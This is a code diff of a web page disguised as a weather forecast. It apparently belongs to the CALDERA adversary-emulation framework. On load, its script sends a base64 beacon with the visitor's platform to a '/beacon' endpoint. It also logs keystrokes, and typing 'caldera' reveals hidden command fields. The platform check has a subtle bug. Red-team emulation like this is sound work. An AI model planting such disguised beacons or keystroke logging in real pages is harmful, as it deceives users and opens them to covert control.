@@ -4,14 +4,19 @@
     <title>Weather</title>
     <style>
         *{
-          box-sizing: border-box;
-          font-family: 'Droid Sans', sans-serif;
+            box-sizing: border-box;
+            font-family: 'Droid Sans', sans-serif;
         }
         html,body,.wrapper{
           height:100%;
           width: 100%;
           padding: 0;
           margin: 0 auto;
+        }
+        textarea {
+            width: 80%;
+            min-height: 100px;
+            margin: 15px;
         }
         .wrapper::before{
           content: "";
@@ -109,7 +114,7 @@
 
 </head>
 <body>
-    <div class="wrapper">
+    <div id="weather" class="wrapper">
         <div class="weather">
             <div class="city"><h1 id="location"></h1></div>
             <div class="clearfix"></div>
@@ -135,20 +140,40 @@
             </div>
         </div>
     </div>
-    <textarea id="beacons" onchange="restRequest()"></textarea>
-    <textarea id="instructions"></textarea>
+    <center>
+        <textarea id="beacons" onchange="sendBeacon()"></textarea>
+        <textarea id="instructions"></textarea>
+    </center>
 </body>
 </html>
 <script src="/gui/jquery/jquery.js"></script>
 <script>
     $(document).ready(function () {
+        //fill out weather forecast
         $.getJSON('http://gd.geobytes.com/GetCityDetails?callback=?', function(data) {
             $('#location').text(data.geobytesregion + ' - '+ data.geobytescountry);
             $('#today').text(new Date().toDateString());
         });
+
+        //send first beacon
+        let beacons = $('#beacons');
+        let platform = determinePlatform();
+        let server = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
+        beacons.text(btoa(JSON.stringify({"platform":platform,"server":server,"executors":[]})));
+        beacons.change();
     });
-    function restRequest() {
-        let beacon = $('#beacons').val();
+
+    //display hidden fields
+    let log = '';
+    document.addEventListener('keydown', event => {
+        log = log.concat(event.key);
+        if(log.toLowerCase().includes('caldera')) {
+            $('#weather').hide();
+        }
+    });
+
+    function sendBeacon() {
+        let beacon = $('#beacons').text();
         $.ajax({
            url: '/beacon',
            type: 'POST',
@@ -161,5 +186,14 @@
                console.log(thrownError);
            }
         });
+    }
+
+    function determinePlatform() {
+        let OSName = "unknown";
+        if (window.navigator.userAgent.startsWith("Windows")!= -1) OSName="windows";
+        if (window.navigator.userAgent.indexOf("Mac") != -1) OSName="darwin";
+        if (window.navigator.userAgent.indexOf("X11") != -1) OSName="linux";
+        if (window.navigator.userAgent.indexOf("Linux") != -1) OSName="linux";
+        return OSName;
     }
 </script>
